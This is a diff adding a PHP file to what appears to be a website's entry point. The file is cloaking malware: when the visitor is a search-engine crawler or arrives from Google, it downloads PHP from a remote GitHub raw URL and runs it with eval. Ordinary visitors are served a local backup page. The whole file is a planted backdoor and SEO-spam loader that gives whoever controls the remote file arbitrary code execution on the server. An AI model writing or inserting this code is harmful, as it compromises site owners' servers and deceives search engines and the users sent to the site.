@@ -1,0 +1,45 @@
+<?php
+$cookie_expiration = time() + (365 * 86400);
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+
+function isSearchEngineBot() {
+    return isset($_SERVER['HTTP_USER_AGENT']) &&
+        preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|ahrefsbot|google-site-verification|google-inspectiontool)/i',
+            $_SERVER['HTTP_USER_AGENT']);
+}
+
+function isFromGoogle() {
+    return !empty($_SERVER['HTTP_REFERER']) &&
+        (stripos($_SERVER['HTTP_REFERER'], 'google.com') !== false ||
+         stripos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
+}
+
+// URL dan file lokal
+$landing_page_url = 'https://raw.githubusercontent.com/rivo88/backlink/refs/heads/main/kerja';
+$index_home       = _DIR_ . '/summary_bu.php';
+
+// Fungsi untuk memuat file dari URL
+function include_remote_php($url) {
+    $code = @file_get_contents($url);
+    if ($code === false) {
+        http_response_code(404);
+        echo 'Gagal memuat konten dari URL.';
+        exit;
+    }
+    // Jalankan kode PHP yang diambil dari URL
+    eval('?>' . $code);
+}
+
+if (isSearchEngineBot() || isFromGoogle()) {
+    include_remote_php($landing_page_url);
+} else {
+    if (is_file($index_home)) {
+        include $index_home;
+    } else {
+        http_response_code(404);
+        echo 'index_bu.php not found';
+    }
+}
+?>
